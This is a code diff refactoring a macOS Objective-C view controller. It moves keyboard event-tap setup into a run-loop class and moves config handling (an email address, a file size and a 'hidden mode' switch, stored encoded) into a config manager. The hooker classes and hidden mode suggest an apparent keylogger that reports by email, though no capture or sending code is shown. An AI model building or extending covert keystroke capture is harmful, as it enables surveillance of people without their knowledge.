@@ -11,19 +11,6 @@
 
 @implementation ViewController
 
-// MARK: - 
-CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
-    int key = (int)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
-    
-    if ([((__bridge ViewController*)refcon).keyBlocker blockCycle:key]) {
-        return nil;
-    }
-    
-    [[(__bridge ViewController*)refcon key] doFullCycle:key];
-    return event;
-}
-
-// MARK: - viewDidLoad
 - (void)viewDidLoad {
     [super viewDidLoad];
     
@@ -42,12 +29,31 @@ CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef
     [FileManager createFile:@"keys"];
     [FileManager createFile:@"buttons"];
     
+    // Mouse hooker
     _mouse = [[MouseHooker alloc] init];
+    
+    // Keyboard hooker
     _key = [[KeyHooker alloc] init:_mouse];
     _keyBlocker = [[BlockKeyManager alloc] init:_buttonsBlockArray :self];
     
-    [KeyRunLoop setRunLoop:myCGEventCallback :(__bridge void*)(self)];
+    // Setting notification and runloop
+    _runloop = [[KeyRunLoop alloc] init:_key :_keyBlocker];
+    [_runloop setRunLoop];
+    //[KeyRunLoop setRunLoop:myCGEventCallback :(__bridge void*)(self)];
     [_mouse setMouseNotifications];
+}
+
+// Set hidden mode switch according to config file
+- (void)viewWillAppear {
+    NSInteger state = [ConfigManager getCurrentState];
+    if (state != -1) {
+        [_hiddenModeSwitch setState:state];
+    }
+}
+
+// MARK: - Value of hidden mode switch changed
+- (IBAction)hiddenModeSwitchChanged:(id)sender {
+    [ConfigManager updateState:[sender state]];
 }
 
 // MARK: - Controlling e-mail and file size NSTextField input
@@ -86,17 +92,7 @@ CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef
 
 // MARK: - User clicked "Save changes" button
 - (IBAction)clickedSaveButton:(id)sender {
-    [FileManager createFile:@"config"];
-    
-    if ([RegexManager validateEmail:[_emailTextField stringValue]] && [RegexManager validateDigitsOnly:[_fileSize stringValue]]) {
-        NSString *email = [Cryptographer doIt:[_emailTextField stringValue]];
-        NSString *size = [Cryptographer doIt:[_fileSize stringValue]];
-        NSString *mode = [Cryptographer doIt:[NSString stringWithFormat:@"%ld", (long)[_hiddenModeSwitch state]]];
-        
-        [FileManager writeToFile:@"config" file:[NSString stringWithFormat:@"%@\n", email]];
-        [FileManager writeToFile:@"config" file:[NSString stringWithFormat:@"%@\n", size]];
-        [FileManager writeToFile:@"config" file:[NSString stringWithFormat:@"%@", mode]];
-    }
+    [ConfigManager updateConfig:[_emailTextField stringValue] Size:[_fileSize stringValue] State:[_hiddenModeSwitch state]];
 }
 
 // MARK: - BlockKeyManager delegate methods
@@ -175,7 +171,7 @@ CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef
     }
 }
 
-// MARK: - Block key buttonsb
+// MARK: - Block key buttons
 - (IBAction)clickedDeleteButton:(id)sender {
     NSInteger currentRow = [_tableView selectedRow];
     if (currentRow >=0) {
